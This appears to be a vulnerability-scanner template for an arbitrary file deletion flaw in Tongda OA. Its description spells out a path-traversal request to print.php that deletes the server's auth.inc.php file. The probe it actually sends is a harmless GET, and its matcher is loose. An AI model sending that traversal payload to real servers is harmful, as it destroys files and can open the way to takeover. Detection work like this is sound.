id: tongda-Delete-any-file
info:
  name: tongda-Delete-any-file
  author: apple
  severity: high
  description: 通达 OA 存在任意文件删除漏洞，删除路径为：/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php 
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/3a81e5cf6dc36962151e6b2ed07182341e5e35a8/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA%20v11.6%20print.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE.md
  tags: tongda
http:
  - raw:
      - |+
        GET /module/appbuilder/assets/print.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.31.0
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close

    matchers:
      - type: word
        part: header
        words:
          - '200'
